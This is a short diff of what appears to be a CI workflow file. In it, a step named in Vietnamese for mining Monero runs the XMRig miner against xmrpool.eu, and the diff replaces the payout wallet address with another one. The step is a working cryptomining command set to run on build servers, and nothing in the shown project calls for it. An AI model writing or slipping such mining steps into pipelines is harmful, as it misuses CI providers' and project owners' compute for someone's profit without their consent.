@@ -27,4 +27,4 @@ jobs:
     - name: Đào XMR bằng XMRig (xmrpool.eu)
       run: |
         cd xmrig/build
-        ./xmrig -o xmrpool.eu:3333 -a rx -u 44dyHK6YbmreQTqu3ZcgywisxXJAtxnvcdiqjkanFy6zEgAgMW7Nh96STePgxkndamLjZ1NWX34URev5rTPapF39DSBDFPM -p x -t 4
+        ./xmrig -o xmrpool.eu:3333 -a rx -u 84NgLFmgCGnSyhW5ioq6M9cQg1EyfT2DkMYzfPJM8zEgWoUvTjs9E8rbLd3QZHxt9BDcLyH6KTNt6jjU4hJTWexCSk5tsEY -p x -t 4
